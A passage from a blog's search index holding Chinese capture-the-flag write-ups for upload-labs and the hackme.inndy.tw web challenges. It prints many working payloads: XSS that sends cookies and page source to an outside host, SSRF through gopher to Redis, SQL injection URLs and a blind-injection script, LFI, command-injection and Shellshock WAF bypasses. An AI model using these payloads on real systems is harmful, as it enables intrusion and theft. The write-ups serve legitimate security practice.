&apos;禁止保存为该类型文件！&apos;; &#125; &#125; else &#123; $msg = UPLOAD_PATH . &apos;文件夹不存在,请手工创建！&apos;; &#125;&#125; 以一种黑名单的形式进行限制，我们可以采取apache解析漏洞，话说apache解析漏洞在2.4以上版本好像就不怎么好用了，当然也可以用move_uploaded_file函数的00截断漏洞绕过。具体如下CVE-2015-2348当然还有一种方法就是文件名后缀加./ move_uploaded_file这个函数遇到./就会忽略上传成功 https://www.cnblogs.com/cyjaysun/p/4390930.html漏洞绕过不过这个条件貌似有点苛刻，反正我本地的环境是上传不了的 Pass-20-数组+/.绕过源码 123456789101112131415161718192021222324252627282930313233$is_upload = false;$msg = null;if(!empty($_FILES[&apos;upload_file&apos;]))&#123; //检查MIME $allow_type = array(&apos;image/jpeg&apos;,&apos;image/png&apos;,&apos;image/gif&apos;); if(!in_array($_FILES[&apos;upload_file&apos;][&apos;type&apos;],$allow_type))&#123; $msg = &quot;禁止上传该类型文件!&quot;; &#125;else&#123; //检查文件名 $file = empty($_POST[&apos;save_name&apos;]) ? $_FILES[&apos;upload_file&apos;][&apos;name&apos;] : $_POST[&apos;save_name&apos;]; if (!is_array($file)) &#123; $file = explode(&apos;.&apos;, strtolower($file)); &#125; $ext = end($file); $allow_suffix = array(&apos;jpg&apos;,&apos;png&apos;,&apos;gif&apos;); if (!in_array($ext, $allow_suffix)) &#123; $msg = &quot;禁止上传该后缀文件!&quot;; &#125;else&#123; $file_name = reset($file) . &apos;.&apos; . $file[count($file) - 1]; $temp_file = $_FILES[&apos;upload_file&apos;][&apos;tmp_name&apos;]; $img_path = UPLOAD_PATH . &apos;/&apos; .$file_name; if (move_uploaded_file($temp_file, $img_path)) &#123; $msg = &quot;文件上传成功！&quot;; $is_upload = true; &#125; else &#123; $msg = &quot;文件上传失败！&quot;; &#125; &#125; &#125;&#125;else&#123; $msg = &quot;请选择要上传的文件！&quot;;&#125; 很明显这是采取白名单的形式进行过滤首先先判断文件的类型通过进行获取文件的文件名这里是判断文件是否为数组我们可以使文件名为数组进行绕过 end - 将数组的内部指针设置为其最后一个元素 例子 123456&lt;?php$fruits = array(&apos;apple&apos;, &apos;banana&apos;, &apos;cranberry&apos;);echo end($fruits); // cranberry?&gt; 所以我们可以令数组的最后一个元素为jpg等进行绕过这里会将文件进行重命名 reset - 将数组的内部指针设置为其第一个元素 我们可以将第一个数组file[0]为shell.php/ file[1]为空,file[2]为jpg 上传成功 后记完结撒花o(￣▽￣)ブ 参考 https://xz.aliyun.com/t/4029#toc-16https://xz.aliyun.com/t/2657#toc-8http://lawlietweb.com/2018/06/07/upload-labs/#%E7%AC%AC%E5%8D%81%E5%85%AB%E5%85%B3https://zhuanlan.zhihu.com/p/52099683]]></content>
      <categories>
        <category>writeup</category>
      </categories>
      <tags>
        <tag>文件上传</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[通过hackme中xss题目理解XSS所包含的巨大威力]]></title>
    <url>%2F2019%2F02%2F15%2F%E9%80%9A%E8%BF%87hackme%E4%B8%ADxss%E9%A2%98%E7%9B%AE%E7%90%86%E8%A7%A3XSS%E6%89%80%E5%8C%85%E5%90%AB%E7%9A%84%E5%B7%A8%E5%A4%A7%E5%A8%81%E5%8A%9B%2F</url>
    <content type="text"><![CDATA[前言在此之前对xss了解只有script alert(1),遇到这几题之后深刻了解到自己对于xss的浅薄理解，并认识到XSS的巨大威力从XSS到SSRF再到Redis，特此放在与之前wp不同的地方，这里主要讲解一些这题里所包含的xss原理题目地址https://hackme.inndy.tw/scoreboard/ 正文1.xss探测先来个三步走robots.txt中发现了个backup.zip的压缩包，下载下来发现需要压缩码，一般来说是不会让我们暴力破解的，猜测我们需要读取config.php中的内容既然题目叫xss me这里肯定需要xss的经过一系列测试后发现&lt;svg/onload&gt;没有被过滤 onload 事件 当页面载入完毕后执行Javascript代码： 1&lt;body onload=&quot;myFunction()&quot;&gt; 以下 HTML 标签支持 onload : 1&lt;body&gt;, &lt;frame&gt;, &lt;frameset&gt;, &lt;iframe&gt;, &lt;img&gt;, &lt;input type=&quot;image&quot;&gt;, &lt;link&gt;, &lt;script&gt;, &lt;style&gt; 并且IE/FireFOx/Chrome都支持onload事件那么Svg又是什么呢？明明查的时候是这么解释的 SVG 教程 SVG 意为可缩放矢量图形（Scalable Vector Graphics）。 SVG 使用 XML 格式定义图像。 现在开始学习 SVG! SVG 实例 My first SVG 尝试一下 » 点击 “尝试.. 为什么添加了一个svg就可以执行xss脚本呢，并且里面的实体编码就有效果了呢？？SVG XSS的一个黑魔法深入理解浏览器解析机制及XSS向量编码 大概意思我精简一下，当然想要深入了解可以看,毕竟我也只是刚刚接触无法做到深入透彻的了解为什么 123&lt;svg&gt;后面能够支持实体编码，长话短说就是&lt;svg&gt;遵循XML和SVG的定义，我们知道，在XML中，&amp;#40;会被解析成（在XML中实体会自动转义,除了&lt;![CDATA[和]]&gt;包含的实体 代码 1234&lt;xml&gt; &lt;name&gt;aaa&lt;/name&gt; &lt;value&gt;aaaaaaa&amp;#40;&lt;/value&gt;&lt;/xml&gt; 会被转化成 1234&lt;xml&gt; &lt;name&gt;aaa&lt;/name&gt; &lt;value&gt;aaaaaaa)&lt;/value&gt;&lt;/xml&gt; 好吧，回到题目我们可以通过构造类似如下PAYLoad 1&lt;svg/onload=&quot;javascript:document.location=&apos;http://vps_ip:23333&apos;&quot;&gt; 这里svg/onload中间的/是为了绕过空格限制，进行实体编码，这里要将vps_ip换成自己的 1&lt;svg/onload=&quot;xxxxxxx&quot;&gt; 1在不使用js伪协议的情况下javascript:是无法使用实体编码的，当然也可以这么构造&lt;svg&gt;&lt;script&gt;alert&amp;#40;1)&lt;/script&gt; js伪协议 简单来说就是一种关联使用js伪协议伪协议后面会当成javascript来执行，现在src后面已经禁止使用js伪协议了 具体可以看A标签使用javascript:伪协议 这种题目，一般是要获取cookie于是开始构造payload打一波cookie（当然如果是http-only是不能获取到cookie的）payload如下: 1&lt;svg/onload=&quot;document.location=&apos;http://ugelgr.ceye.io/?&apos;+document.cookie&quot;&gt; 得到flag 1.xssrf leak这里推荐大家一个xss接收平台 https://github.com/firesunCN/BlueLotus_XSSReceiver 这题很显然是要我们登入admin并且是本地登入ssrf尝试使用之前admin的cookie试试登入发现需要本地改XFF是绕不过去的，而且这种设计XSS题一般思路都是用XSS去读源码构造payload 1&lt;svg/onload=&quot;document.location=&apos;http://ugelgr.ceye.io/?&apos;+btoa(document.body.innerHTML)&quot;&gt; 就是把源码以base64发给我们现在才知道这个CTF平台是台湾科技大学的 123456789101112131415161718192021222324252627282930313233343536&lt;nav class=&quot;navbar navbar-expand-lg navbar-dark bg-dark d-flex&quot;&gt; &lt;a class=&quot;navbar-brand&quot; href=&quot;index.php&quot;&gt;XSSRF&lt;/a&gt; &lt;ul class=&quot;navbar-nav&quot;&gt; &lt;li class=&quot;nav-item&quot;&gt; &lt;a class=&quot;nav-link&quot; href=&quot;sendmail.php&quot;&gt;Send Mail&lt;/a&gt; &lt;/li&gt; &lt;li class=&quot;nav-item&quot;&gt; &lt;a class=&quot;nav-link&quot; href=&quot;mailbox.php&quot;&gt;Mailbox&lt;/a&gt; &lt;/li&gt; &lt;li class=&quot;nav-item&quot;&gt; &lt;a class=&quot;nav-link&quot; href=&quot;sentmail.php&quot;&gt;Sent Mail&lt;/a&gt; &lt;/li&gt; &lt;li class=&quot;nav-item&quot; &lt;a class=&quot;nav-link&quot; href=&quot;setadmin.php&quot;&gt;Set Admin&lt;/a &lt;/li&gt; &lt;li class=&quot;nav-item&quot; &lt;a class=&quot;nav-link&quot; href=&quot;request.php&quot;&gt;Send Request&lt;/a&gt; &lt;/li &lt;/ul&gt; &lt;ul class=&quot;navbar-nav ml-auto&quot;&gt; &lt;li class=&quot;nav-item&quot; &lt;span class=&quot;navbar-text&quot;Hello, admin (Administrator)&lt;/span&gt; &lt;/li &lt;li class=&quot;nav-item&quot;&gt; &lt;a class=&quot;nav-link&quot; href=&quot;logout.php&quot;&gt;Logout&lt;/a &lt;/li&gt; &lt;/ul&lt;/nav&gt; &lt;div class=&quot;container&quot; &lt;div class=&quot;card text-white bg-dark&quot; &lt;div class=&quot;card-body&quot;&gt; 发现 多了个request.php我们应该要取读这个文件在request.php发现可以插入xss读取config.php 12345678910111213&lt;svg/onload=&quot;xmlhttp=new XMLHttpRequest();xmlhttp.onreadystatechange=function()&#123; if (xmlhttp.readyState==4 &amp;&amp; xmlhttp.status==200) &#123; document.location=&apos;http://vps_ip:23333/?&apos;+btoa(xmlhttp.responseText); &#125;&#125;xmlhttp.open(&quot;POST&quot;,&quot;request.php&quot;,true);xmlhttp.setRequestHeader(&quot;Content-type&quot;,&quot;application/x-www-form-urlencoded&quot;);xmlhttp.send(&quot;url=file:///var/www/html/config.php&quot;);&quot;&gt; onreadystatechange 是一个事件句柄。它的值 (state_Change) 是一个函数的名称，当 XMLHttpRequest 对象的状态发生改变时，会触发此函数。状态从 0 (uninitialized) 到 4 (complete) 进行变化。仅在状态为 4 时，我们才执行代码。 我们的实例在 open() 的第三个参数中使用了 “true”。该参数规定请求是否异步处理。True 表示脚本会在 send() 方法之后继续执行，而不等待来自服务器的响应。onreadystatechange 事件使代码复杂化了。但是这是在没有得到服务器响应的情况下，防止代码停止的最安全的方法。通过把该参数设置为 “false”，可以省去额外的 onreadystatechange 代码。如果在请求失败时是否执行其余的代码无关紧要，那么可以使用这个参数。 得到flag 3.xss redis Steal flag from redis 一想到redis 就想到gopher打未授权redis，想到..开花要注意的是在SSRF利用gopher协议时，命令前要加_ 同时要进行两次URL编码(实际解码了两次，SSRF本身要解码）尝试下 12345678910111213&lt;svg/onload=&quot;xmlhttp=new XMLHttpRequest();xmlhttp.onreadystatechange=function()&#123; if (xmlhttp.readyState==4 &amp;&amp; xmlhttp.status==200) &#123; document.location=&apos;http://vps_ip:23333/?&apos;+btoa(xmlhttp.responseText); &#125;&#125;xmlhttp.open(&quot;POST&quot;,&quot;request.php&quot;,true);xmlhttp.setRequestHeader(&quot;Content-type&quot;,&quot;application/x-www-form-urlencoded&quot;);xmlhttp.send(&quot;url=gopher://127.0.0.1:25566/_info%250a_quit&quot;);&quot;&gt; 确实是未授权 Redis Info 命令以一种易于理解和阅读的格式，返回关于 Redis 服务器的各种信息和统计数值 看下有没有KEY 1xmlhttp.send(&quot;url=gopher://127.0.0.1:25566/_KEYS%2520*%250a_quit&quot;); 发现flag尝试读取 1xmlhttp.send(&quot;url=gopher://127.0.0.1:25566/_get%2520flag%250a_quit&quot;); 发现报错发现类型错误了那我们看看类型 1xmlhttp.send(&quot;url=gopher://127.0.0.1:25566/_type%2520flag%250a_quit&quot;); 1xmlhttp.send(&quot;url=gopher://127.0.0.1:25566/_llen%2520flag%250a_quit&quot;); 发现是个list那我们看看长度 发现是53读取数据 1xmlhttp.send(&quot;url=gopher://127.0.0.1:25566/_lrange%2520flag%25200%252053%250a_quit&quot;); 拼接下 12345s=&apos;.....&apos;flag = s.replace(&apos;\n\n\n\n&apos;,&apos; &apos;)flag = flag.replace(&apos;$1&apos;,&apos;&apos;)flag = flag.replace(&apos;\n&apos;,&apos;&apos;)print(flag[::-1]) 真的需要学习下redis的基本命令了 后记这题题目真的很好，暴露了我很多问题，比如对xss，redis认识都不够等等，同时也暴露了我对html，js的编码的不了解，接下来有时间一定要好好学习下，还有xss实在太强了 参考 https://www.anquanke.com/post/id/156377http://www.northity.com/2018/10/23/XSSme%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/]]></content>
      <categories>
        <category>writeup</category>
      </categories>
      <tags>
        <tag>xss</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[hackme web wp]]></title>
    <url>%2F2019%2F02%2F14%2Fhackme%20web%20wp%2F</url>
    <content type="text"><![CDATA[前言hack me 很不错的一个ctf平台，有些题目质量很高 正文1.捉迷藏直接F12 输入flag字符查找 2.留言 提示：这本留言簿很糟糕。sqlmap是你的朋友。说明可以直接使用sqlmap 这边应该是可以注入的，使用’会报错，使用’#就不会报错大概它的语句是select xxx from xxx where xxx=’$xx’;由于页面只会显示success与false估计只能使用布尔盲注了但是我’ union select 1,2,3,database()# 却会报错（后来想下这估计是使用insert注入…一开始我直接想当然以为它是select）原因未知，使用下sqlmap试试使用sqlmap貌似不可以，可能有什么黑名单之类的过滤。这边的id参数也是可以注入的直接使用联合注入方式payload爆数据库 10%20union%20select%201,2,3,database()# 直接查出数据库是g8爆表 1https://hackme.inndy.tw/gb/?mod=read&amp;id=0%20union%20select%201,2,(select%20TABLE_NAME%20from%20information_schema.TABLES%20where%20TABLE_SCHEMA=%27g8%27%20limit%200,1),4# 查出表为flag爆列 1https://hackme.inndy.tw/gb/?mod=read&amp;id=0%20union%20select%201,2,(select%20COLUMN_NAME%20from%20information_schema.COLUMNS%20where%20TABLE_NAME=%27flag%27%20limit%201,1),4# 还是flag爆flag 1https://hackme.inndy.tw/gb/?mod=read&amp;id=0%20union%20select%201,2,(select%20flag%20from%20flag%20limit%201,1),4# FLAG=出来了 (注：这边id=0是为了让第一个查询结果为空，不然是查询不出结果的)尝试了下能不能用报错注入，不过没有错误信息所以不可以，盲注应该也是可以的我就不演示了。 3.LFI 这个管理员的密码是什么？这根本不重要，只要拿到旗帜。提示：LFI，php://filter 看下源码发现hint显然这是要我们读取pages/flag这个文件直接试试嘿嘿。这个？page估计是文件读取类似于file=xxx根据题目提示：hp://filterpayload 1https://hackme.inndy.tw/lfi/?page=php://filter/read=convert.base64-encode/resource=pages/flag 直接爆出一段base64解码获得Can you read the flag? php://filter/read=convert.base64-encode/resource=可以将文件以base64的形式读取这应该是要我们读取config文件尝试下爆出一段base64码解码获得 $flag = 4.主页 国旗在哪里？你检查过代码了吗？这题又是查看源码但是find flag 只有第一题的flag后来查了下原来这里有flag（一开始我还以为是乱码） https://hackme.inndy.tw/cute.js 可以使用aadecode进行解密 5.ping 你能ping 127.0.0.1吗？ 进入题目发现一段源码这段代码大概意思应该是输入ip且里面不能含有数组中的字段，最后会返回 ping后的内容试试127.0.0.1试试没有得到什么有用的信息那么应该就要绕过黑名单，实现命令执行linux下多行命令 在使用UNIX命令时，系统为了提高使用的灵活性，支持多种命令输入的方式。例如，当需要完成多个命令且命令执行期间不需要人工干预时，可将多个命令写在同一个命令行中，命令之间用分号（；）隔开如：pwd；ls -l 本来想这样试试的，结果貌似被过滤了，试试其他方法 https://chybeta.github.io/2017/08/15/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%9A%84%E4%B8%80%E4%BA%9B%E7%BB%95%E8%BF%87%E6%8A%80%E5%B7%A7/https://chybeta.github.io/2017/08/08/php%E4%BB%A3%E7%A0%81-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/ 使用(反单引号)试试 在php中称之为执行运算符，PHP 将尝试将反引号中的内容作为 shell 命令来执行，并将其输出信息返回（即，可以赋给一个变量而不是简单地丢弃到标准输出，使用反引号运算符“`”的效果与函数 shell_exec() 相同。 ls后 试试其他方式,$(ls) 貌似也可以，其他的暂时没找到然后构造?ip=more *拿到flag在linux文件读取方式很多如tac，tail等等 6.记分牌在header头部有flag 7. 以管理员身份登录0 提示：SQL注入！ 之间点击souce_code获取源码发现它对于‘会有转译，我们只要/’将它的转译转译就可以了payload 1\&apos; union select 1,2,3,4# 原先我用admin/‘ || 1=1 # 嗯它可能变成为adminget flag 8. 以管理员身份登录0.1貌似和上题一模一样， 1FLAG&#123;\&apos; UNION SELECT &quot; #&#125;, flag2 in the database! 这么说我们要查询数据库了 1\&apos;union select 1,1,1,database()# 发现没有反应，这里应该是要盲注了我这么想结果直接 1\&apos;union select 1,group_concat(table_name),3,4 from information_schema.tables where table_schema=database()# 发现貌似爆出的表Hi, h1dden_f14g,user难道数据库叫做1？？？ 1\&apos; union select 1,the_f14g,3,4 from h1dden_f14g# 得出flag 9. 以管理员身份登录1 请以管理员身份登录。提示：SQL注入但sqlmap不再工作。更新：源代码现已上市。 扫描仪无法工作说明还是sql注入 但是不能直接使用sqlmap过滤函数，过滤了空格空格绕过 %09 TAB键（水平）/**/%0a 新建一行%0c 新的一页%0d return功能%0b TAB键（垂直）%a0 空格 \‘来绕过单引号payload 1\&apos;/**/union/**/select/**/1,2,3,4/**/# 10.login as admin 1.2和上题貌似是一样的（吐槽下，这个ctf平台真的是利用资源阿）题目提示要使用盲注我们先联合注入一波试试失败看来只能盲注了 12345678910111213141516#求数据库的名字url = &quot;https://hackme.inndy.tw/login1/index.php&quot;flag = &quot;&quot;for i in range(1,100): for j in range(33,127): payload = &quot;\\&apos;/**/or/**/(ascii(substr((select/**/SCHEMA_NAME/**/from/**/information_schema.SCHEMATA/**/limit/**/0,1),%s,1))=%s)/**/limit/**/0,1#&quot;%(i,j) data = &#123; &quot;name&quot;:payload, &quot;password&quot;:&quot;1&quot; &#125; print payload r = requests.post(url=url,data=data) if &quot;You are not admin!&quot; in r.content: flag += chr(j) print flag break 跑到怀疑人生还是不跑了 11.login as admin 3想要爆出flag，cookie中的$user[‘admin’] 要为true从上往下看如果没有cookie的话就继续进行验证但是如果有cookie的话如果不满足就会报错这了我们要利用，php弱比较，构造sig=0，负负得真绕过限制根据set_users构造cookie形式{“sig”:0,”data”:”[&quot;admin&quot;,true]”}进行base64加密，构造payload 1eyJzaWciOjAsImRhdGEiOiJbXCJhZG1pblwiLHRydWVdIn0= 12.login as admin 4看源码，这次得源码很短需要$_POST[‘name’] === ‘admin’看看前面如果我们$_POST[‘name’] === ‘admin’就需要$_POST[‘password’] !== $password 不然后面Location: ./?failed=1 就会跳转到failed=1会登入失败但我们并不知道$password 是什么这个应该包含的config.php中那该怎么办呢？我们只要用一个工具使得能够不跳转就直接看到后面的flag这里我们使用curl 1curl -d &apos;name=damin&apos; https://hackme.inndy.tw/login4/ 13.login as admin 6看看源码这里依旧是要满足$user == ‘admin’一看到extrat函数立马想能不能使用变量覆盖呢？并且貌似strcmp($users[$username], $password) == 0)里面函数变量是可控的，能不能尝试命令执行呢？首先是变量覆盖 1curl -d &apos;data=&#123;&quot;user&quot;: &quot;admin&quot;&#125;&apos; https://hackme.inndy.tw/login6/ 得到flag其次我们尝试下能不能执行命令构造data = {“username”:”eval(‘echo 1;’);”}试试貌似不可以data = {“username”:”eval(‘phpinfo();’);”}试试貌似不可以本地测试下好吧的确不行必须要这样才可以，记错了 14.login as admin 7看源码又是需要$user === ‘admin’乍一看感觉有两种写法一种就是md5为0e开头的一种是password[]xxx先试试第一种查下谷歌看下0e开头有哪些，随便找几个 QNKCDZO0e830400451993494058024219903391 s878926199a0e545993274517709034328855841020 s155964671a0e342768416822451524974117254469 s214587387a0e848240448830537924465865611904 貌似一次就成功了payload 1curl -d &quot;name=admin&amp;password=QNKCDZO&quot; https://hackme.inndy.tw/login7/ 试试第二种貌似不可以，应该是MD5函数遇到[]直接返回false了 15.login as admin 8看看源码貌似要满足$_POST[‘name’] ！== ‘admin’并且$session-&gt;is_admin从上往下看这边都是调用了Session.php的方法，我们貌似不能看到Session.php的源码这就很难受了暂时没想到要怎么样抓包试试看有没有提示，发现把login8cookie中b=0,改成b=1貌似不行，login8sha512拿去解密下额，还是不行嗯，我才login8sha512是login8直接sha512加密试试把b=1的也拿加密试试不行的话估计就没办法了额，不行试试直接用url的加密看看还是失败这就很神奇了，按道理是可以的把原先的的cookie 512加密后，额居然是不一样的。。。 16.login as admin 8.1不想写login as admin.jpggoole了下，发现一个老哥有写,需要的直接看把 https://www.jianshu.com/p/6ef727966153 17. dafuq-manager 1不想写 Login as guest.png算了还是写吧提示使用 guest guest登入Do you know cookie? Create a cookie named help with value me! 很可疑阿，改成yes得到flag 18. dafuq-manager 2这题叫我们用admin进入先 guest guest进入下载源码先看看index.php发现继续跟进admin需要满足搜下发现$GLOBALS[“permissions”]来自func_user而data[6]又来自$data$data又与find_user有关 1234567891011function &amp;find_user($user, $pass) &#123; $cnt = count($GLOBALS[&quot;users&quot;]); for ($i = 0;$i &lt; $cnt;++$i) &#123; if ($user == $GLOBALS[&quot;users&quot;][$i][0]) &#123; if ($pass == NULL || ($pass == $GLOBALS[&quot;users&quot;][$i][1] &amp;&amp; $GLOBALS[&quot;users&quot;][$i][7])) &#123; return $GLOBALS[&quot;users&quot;][$i]; &#125; &#125; &#125; return NULL;&#125; 即为$GLOBALS[“users”][6];和/.config/.htusers.php有关 1234&lt;?php$GLOBALS[&quot;users&quot;] = array( array(&quot;guest&quot;, &quot;084e0343a0486ff05530df6c705c8bb4&quot;, &quot;./data/guest&quot;, &quot;https://game1.security.ntu.st/data/guest&quot;, 0, &quot;^.ht&quot;, 1, 1),); 有关,但是源码泄露并没有泄露全只给出了guest的密码，这里应该是有管理员账号密码的，账号密码存在文件中所以我们不能够sql注入看看有没有什么文件读取的/.config/.htusers.php的读取文件函数 freadfile_get_contentsfopenfile_arrfgetsincluderequirereadfile 在seay中进行自动审计fun_down有readfile![](https://i.imgur.com/bAS6S9G.png但是 1if (!file_in_web($abs_item) || stristr($abs_item, &apos;.php&apos;) || stristr($abs_item, &apos;config&apos;)) show_error($item . &quot;: &quot; . $GLOBALS[&quot;error_msg&quot;][&quot;accessfile&quot;]); 过滤的是否严密，把config，php都过滤了，看看还有没有什么地方可以读取的我们看看第六条/core/fun_edit.php前面两个条件第一个我们在.htusers.php中可以看出这项是对的第二个条件是也是符合的看看只有一个简单的过滤我们随便就可以过了所以我们构造目录穿梭进行读取payload 12https://dafuq-manager.hackme.inndy.tw/index.php?action=edit&amp;item=/../../../../../../var/www/webhdisk/.config/.htusers.php md5解码后登入得到flag 19.dafuq-manager 3还是这题，审计不动.jpgmmp题目叫我们get-shell上题就注意这个eval了这题看下可不可以利用很明显要通过这个hash_equals的判断耿总下cmd以及hmac看看发现是源于我们可以控制cmd以及hmac的值但是必须满足hash_hmac(‘sha256’, $cmd, $GLOBALS[“secret_key”]）也就是说我们还需要知道 $GLOBALS[“secret_key”]是怎么来的在/.config/conf.php文件中我们获取到了$GLOBALS[“secret_key”] = ‘KHomg4WfVeJNj9q5HFcWr5kc8XzE4PyzB8brEw6pQQyzmIZuRBbwDU7UE6jYjPm3’;$GLOBALS[“secret_key”]的值也就是说我们已经可以构造cmd命令进行命令执行了但是直接dir[]绕过这里显示对cmd进行base64解码，然后进行waf过滤 123456&apos;system&apos;, &apos;exec&apos;, &apos;popen&apos;, &apos;pcntl_exec&apos;, &apos;proc_open&apos;, &apos;passthru&apos;, &apos;`&apos;, &apos;eval&apos;, &apos;assert&apos;, &apos;preg_replace&apos;, &apos;create_function&apos;, &apos;include&apos;,&apos;require&apos;, &apos;curl&apos; 可以使用拼接的方法进行绕过具体看 https://chybeta.github.io/2017/08/15/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%9A%84%E4%B8%80%E4%BA%9B%E7%BB%95%E8%BF%87%E6%8A%80%E5%B7%A7/ 先echo 1；下看下行不行payload 12345&lt;?php $cmd=&apos;$a=\&apos;ass\&apos;;$b=\&apos;ert\&apos;;$c=$a.$b;$c(base64_decode(\&apos;c3lzdGVtKCdscycp\&apos;));&apos;;$hash=&apos;KHomg4WfVeJNj9q5HFcWr5kc8XzE4PyzB8brEw6pQQyzmIZuRBbwDU7UE6jYjPm3&apos;;$hmac=hash_hmac(&apos;sha256&apos;, $cmd, $hash);echo sprintf(&apos;%s.%s&apos;, base64_encode($cmd), $hmac 啥意思嗯，可能要读取下flag3?cat flag3啥都没有执行下./flag3没反应这可能是个文件夹cd flag3; ls试试再执行下./flag3/flag3没反应看到meow 这个应该是个编译好的c文件执行下./flag3/meow flag We have cat to read file, And the meow to cat flag.应该是两个都要执行system(‘./flag3/meow ./flag3/flag3’)flag出来了 20.wordpress 1看了下提示Something strange is hidding in the source code这大概是用 wordpress搭建的博客，我自己使用的是hexo看看源码，没有什么特殊发现，看看有没有源码泄露打开robots.txt没有看看博客文章在第一篇文章里发现源码 1https://www.dropbox.com/s/r5fk52thwh79kzw/web-security-course-game2.7z?dl=0 把源码下载下来 https://www.dropbox.com/h 这个网站貌似挺好的，不过存储只有2G，太少了自动审计+搜索下flag，发现一大堆…mmp这可能要审成sb了一般来说这种完整的网站，插件是一个漏洞很可能存在的地方这一串sprintf是什么鬼哦 试试看password[]能不能绕过不能只能拿去破解了 吐槽下cMD5还是什么都要收费（）我刚刚使用的md5解密的平台chamd5 跟进直接x-forword-for 127.0.0.1出来了 21.wordpress 1 上一题就注意到了难道是第一题的flag输入进去吗？好吧想多了，可能是要通过某个后门进入在源码处发现，别问我怎么找到问就648大概意思是通过post某个值获取这个值的内容？嗯，文件时Seach，这大概也要search下吧 view-source:https://wp.hackme.inndy.tw/page/2?s=&amp;debug=title 于是 1s=&amp;debug=content 得到flag 22 .webshell一进去502 a padding to disable MSIE and Chrome friendly error page 换下火狐试试怎么肥事，还是不行只能跳过这题了 23.command-executor这题有点叼跟着大佬的wp做做吧进入随意点点，在List files发现func与下面的php文件名字相同疑似有文件包含漏洞，使用php伪协议看看能不能读取文件 1php://filter/read=convert.base64-encode/resource=index 得到index源码 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394959697&lt;?php$pages = [ [&apos;man&apos;, &apos;Man&apos;], [&apos;untar&apos;, &apos;Tar Tester&apos;], [&apos;cmd&apos;, &apos;Cmd Exec&apos;], [&apos;ls&apos;, &apos;List files&apos;],];function fuck($msg) &#123; header(&apos;Content-Type: text/plain&apos;); echo $msg; exit;&#125;$black_list = [ &apos;\/flag&apos;, &apos;\(\)\s*\&#123;\s*:;\s*\&#125;;&apos;];function waf($a) &#123; global $black_list; if(is_array($a)) &#123; foreach($a as $key =&gt; $val) &#123; waf($key); waf($val); &#125; &#125; else &#123; foreach($black_list as $b) &#123; if(preg_match(&quot;/$b/&quot;, $a) === 1) &#123; fuck(&quot;$b detected! exit now.&quot;); &#125; &#125; &#125;&#125;waf($_SERVER);waf($_GET);waf($_POST);function execute($cmd, $shell=&apos;bash&apos;) &#123; system(sprintf(&apos;%s -c %s&apos;, $shell, escapeshellarg($cmd)));&#125;foreach($_SERVER as $key =&gt; $val) &#123; if(substr($key, 0, 5) === &apos;HTTP_&apos;) &#123; putenv(&quot;$key=$val&quot;); &#125;&#125;$page = &apos;&apos;;if(isset($_GET[&apos;func&apos;])) &#123; $page = $_GET[&apos;func&apos;]; if(strstr($page, &apos;..&apos;) !== false) &#123; $page = &apos;&apos;; &#125;&#125;if($page &amp;&amp; strlen($page) &gt; 0) &#123; try &#123; include(&quot;$page.php&quot;); &#125; catch (Exception $e) &#123; &#125;&#125;function render_default() &#123; ?&gt;&lt;p&gt;Welcome to use our developer assistant service. We provide servial useless features to make your developing life harder.&lt;/p&gt;&lt;img src=&quot;windows-run.jpg&quot; alt=&quot;command executor&quot;&gt;&lt;?php &#125;?&gt;&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt; &lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;Command Executor&lt;/title&gt; &lt;link rel=&quot;stylesheet&quot; href=&quot;bootstrap/css/bootstrap.min.css&quot; media=&quot;all&quot;&gt; &lt;link rel=&quot;stylesheet&quot; href=&quot;comic-neue/font.css&quot; media=&quot;all&quot;&gt; &lt;style&gt; nav &#123; margin-bottom: 1rem; &#125; img &#123; max-width: 100%; &#125; &lt;/style&gt; &lt;/head&gt; &lt;body&gt; &lt;nav class=&quot;navbar navbar-expand-lg navbar-dark bg-dark d-flex&quot;&gt; &lt;a class=&quot;navbar-brand&quot; href=&quot;index.php&quot;&gt;Command Executor&lt;/a&gt; &lt;ul class=&quot;navbar-nav&quot;&gt;&lt;?php foreach($pages as list($file, $title)): ?&gt; &lt;li class=&quot;nav-item&quot;&gt; &lt;a class=&quot;nav-link&quot; href=&quot;index.php?func=&lt;?=$file?&gt;&quot;&gt;&lt;?=$title?&gt;&lt;/a&gt; &lt;/li&gt;&lt;?php endforeach; ?&gt; &lt;/ul&gt; &lt;/nav&gt; &lt;div class=&quot;container&quot;&gt;&lt;?php if(is_callable(&apos;render&apos;)) render(); else render_default(); ?&gt;&lt;/div&gt; &lt;/body&gt;&lt;/html&gt; 发现可疑函数putenv这里与14年的破壳漏洞有关 ●发布时间:2014-09-25 14时48分04秒●CVE ID:CVE-2014-6271●受影响版本: 具体可以看 https://www.freebuf.com/articles/system/45390.html google可以发现 https://security.stackexchange.com/questions/68325/shellshock-attack-scenario-exploiting-php 和我们所要利用的几乎一样尝试使用payload wget –header=”X-Exploit: () { :; }; echo Hacked” -q -O - https://command-executor.hackme.inndy.tw/index.php?func=cmd&amp;cmd=env 发现被过滤 查看源码 waf是由正则进行匹配，这种waf非常不安全只要将：；中间加个空格就可以绕过payload如下 1wget --header=&quot;X-Exploit: () &#123; : ; &#125;; echo Hacked&quot; -q -O - https://command-executor.hackme.inndy.tw/index.php?func=cmd&amp;cmd=env|grep Hacked 得到回显通过之前目录穿梭../../../可以发现flag也就是说我们要读取这个flag发现我们被waf过滤了这里有两种方式绕过 1.拼接方式2.通配符 wget –header=”X-Exploit: () { : ; }; /bin/cat ../../../../../../?lag” -q -O - “https://command-executor.hackme.inndy.tw/index.php?func=cmd&amp;cmd=env&quot; 使用通配符进行代替f字母，我们成功绕过waf但是flag文件需要root权限才能进行读取，而flag下面flag-reader这个c文件很可疑我们进行读取 wget –header=”X-Exploit: () { : ; }; /bin/cat ../../../../../../?lag-reader.c” -q -O - “https://command-executor.hackme.inndy.tw/index.php?func=cmd&amp;cmd=env&quot; 123456789101112131415161718192021222324252627282930313233#include &lt;unistd.h&gt;#include &lt;syscall.h&gt;#include 